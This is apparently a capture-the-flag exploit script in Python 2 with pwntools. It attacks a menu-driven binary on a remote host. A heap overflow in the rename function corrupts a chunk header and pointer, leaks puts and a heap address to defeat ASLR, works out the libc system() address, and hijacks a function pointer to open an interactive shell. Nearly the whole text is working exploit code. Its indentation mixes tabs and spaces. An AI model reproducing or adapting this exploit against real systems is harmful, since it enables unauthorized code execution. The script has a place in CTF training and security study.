from pwn import *

context(os='linux',arch='amd64',log_level='debug')
#p = process('task_main')
libc = ELF('libc-2.23_x64.so')
p = remote('49.4.23.26','31529')
#gdb.attach(p)
def get(length,name):
	p.recvuntil('Choice >>')
	p.sendline('1')
	p.recvuntil('s name:')
	p.sendline(str(length))
	p.recvuntil('s name:')
	p.sendline(name)

def open1(index):
	p.recvuntil('Choice >>')
        p.sendline('2')
        p.recvuntil('open?')
	p.sendline(str(index))

def change(index,new_length,new_name):
	p.recvuntil('Choice >>')
        p.sendline('3')
	p.recvuntil('name?')
	p.sendline(str(index))
	p.recvuntil('name:')
	p.sendline(str(new_length))
	p.recvuntil('name:')
	p.send(new_name)

get(16,'/bin/sh')
get(16,'bbbb')

payload = 'a'*16+p64(0)+p64(0x21)+'\x18'
change(0,48,payload)
open1(1)
p.recvuntil('owner!\n')

puts_addr = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))
print 'puts_addr: '+hex(puts_addr)

libc_base = puts_addr - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
print 'libc_base: '+hex(libc_base)
print 'system_addr: '+hex(system_addr)

payload2 = 'a'*16+p64(0)+p64(0x21)+'\x10'
change(0,48,payload2)
open1(1)
p.recvuntil('owner!\n')
aslr_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00'))-0x30

print 'aslr_base: '+hex(aslr_base)
binsh_addr = aslr_base+0x30
print 'binsh_addr: '+hex(binsh_addr)

payload3 = ('/bin/sh\x00'.ljust(16,'a'))+p64(0)+p64(0x21)+p64(binsh_addr)+p64(system_addr)
change(0,56,payload3)
open1(1)

p.interactive()
